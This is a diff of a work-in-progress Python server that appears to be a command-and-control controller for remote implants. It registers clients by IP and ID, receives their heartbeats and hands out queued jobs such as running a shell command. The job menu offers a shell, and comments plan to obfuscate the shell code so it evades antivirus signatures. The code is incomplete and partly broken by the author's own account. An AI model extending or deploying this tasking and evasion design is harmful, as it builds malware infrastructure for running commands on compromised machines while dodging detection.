@@ -22,6 +22,8 @@ class s_sock:
         self.server.listen()  
         
         self.clients = {}
+        self.current_clients = []
+        
         
         ## threading for clients, each connection will do a new thread (need to make sure each thread dies properly)
         while True:
@@ -30,28 +32,51 @@ class s_sock:
             
             ## Getting client id from the client, and the IP address
             self.ip_address = self.conn.getpeername()[0]
-            self.id = self.conn.recv(1024).decode()
+            
+            self.response = self.conn.recv(1024).decode().split("\|/")
+            
+            response_list = []
+            for i in self.response:
+                response_list.append(i)
+                        
+            self.id = response_list[0]
+            self.message = response_list[1]
+            
+            #message = "ok"
+            #self.conn.send(message.encode())
             
             ## Creating the name in format of '127_0_0_1_QWERT' aka 'IP_ID'
-            
             client_name = "client_" + self.ip_address.replace(".", "_") + "_" + self.id
-            
-            ## creating object intance
-            client = s_perclient()
+            ## If the client hasn't been seen before, create new client ID n stuff
+            if client_name not in self.current_clients:
+                self.current_clients.append(client_name)
+                
+                ## creating object intance
+                client = s_perclient()
 
-            # something dict
-            self.clients[client_name] = client
-            
-            ''' THis is what the dict looks like, each "name" is pointing at a class object
-            clients = {
-                "client_192_168_0_1_1": <s_perclient object at 0x7fda883e4c70>,
-                "client_192_168_0_2_1": <s_perclient object at 0x7fda883e4d00>,
-                "client_192_168_0_2_2": <s_perclient object at 0x7fda883e4d90>
-            }
-            '''
+                # something dict
+                self.clients[client_name] = client
+                
+                ''' THis is what the dict looks like, each "name" is pointing at a class object
+                clients = {
+                    "client_192_168_0_1_1": <s_perclient object at 0x7fda883e4c70>,
+                    "client_192_168_0_2_1": <s_perclient object at 0x7fda883e4d00>,
+                    "client_192_168_0_2_2": <s_perclient object at 0x7fda883e4d90>
+                }
+                '''
 
-            globals()[client_name] = client
-            thread = threading.Thread(target=client.handle_client, args=(self.conn, self.ADDR))
+                globals()[client_name] = client
+            
+            else:
+                print("client exists")
+                pass
+                ## strip client ID, and pass response along to the client class.
+            
+            ## starting thread for individual client, and listening for message coming back...
+            ## which wont work as hot damn the server is also listening for conenctions
+            
+            ## TLDR, this is passing the ID, and Message recieved to the correct class & then that class handles it 
+            thread = threading.Thread(target=client.handle_client, args=(self.conn, self.ADDR, self.response, self.id))
 
             thread.start()  
     
@@ -90,28 +115,45 @@ class s_sock:
 ##########
 
 class s_perclient:
-    def handle_client(self, conn, addr):
-            
+    def __init__(self):
+        self.first_time = 0
+        # setting current job to none to start
+        self.current_job = None
+    
+    def handle_client(self, conn, addr, message, id):
+        
         self.conn = conn
         self.addr = addr
         self.ip = addr[0]
         self.port = addr[1]
+        self.id =  id
+        
+        ## Sending message back to client that connection is ok
+        #self.send_msg("ok")
+        print(f"message: {message}")
     
-        while True:
-            # Receive/Listen for message from client
-            received_msg = conn.recv(1024).decode()
+        while message:
+            #print(f"First Time {self.first_time}")
             
-            ## every time a message comes back, it has to do something
-            # This aligns with the protocol
+                # Receive/Listen for message from client
+            #received_msg = conn.recv(1024).decode()   
+            #print(received_msg)            
             
-            self.decision_tree(received_msg)
+            ## Receiveing message from server portion & running through filters
+            print("Call Decision Tree")
+            self.decision_tree(message)
             
-            if not received_msg:
+            ## setting message to none so this waits for a message b4 looping
+            
+            
+            if not message:
                 # Client has closed the connection, exit the loop
 
                 print("Conn Closed\n\n")
                 break
             
+            message = None
+
             # Process the received message
             #self.decision_tree(received_msg)
             
@@ -119,12 +161,21 @@ class s_perclient:
         conn.close()
     
     def decision_tree(self, received_msg):
-        pass
-    
-        if received_msg == "heartbeat":
+        print(f"decision tree called, message recieved: {received_msg}")
+        
+        print(f"MSG: {received_msg}, ID: {self.id}")
+        
+        if received_msg[0] == self.id:
+            print(f"Recieved heartbeat from {self.ip}")
             ## check current_job, & send job ONLY on heartbeat
-            if self.current_job != "none":
+            
+            if self.current_job != None:
+                print(f"Sending Current Job: {self.current_job}")
+                ## sending job
                 self.send_msg(self.current_job)
+            
+            else:
+                print("No Current Job available, client will sleep")
     
     ## This part is what the user interacts with, and it sets self.current_job based on the decision. 
     
@@ -134,7 +185,11 @@ class s_perclient:
         
         if user_input == "jobs":
             print("Jobs: \nShell [IP, Port] ")
-        
+            
+        elif user_input == "run_command":
+            command = "ls"
+            self.current_job = f"run_command\|/{command}"
+            
         ## Idea for shell, have all the code on this side. That way, you just pass the string/command in, and 
         ## can have it obsfucated. The client will then execute said code. This may also help with signatures of common
         ## shells if embedded in the client code
@@ -165,7 +220,7 @@ if __name__ == "__main__":
     ## could listen on multiple ports with threading this whole thing
     SERV = s_sock()
 
-    background_listen = threading.Thread(target=SERV.start_server, args=('0.0.0.0',8096))
+    background_listen = threading.Thread(target=SERV.start_server, args=('0.0.0.0',8105))
     background_listen.start() 
     
     #SERV.start_server('0.0.0.0',8092)
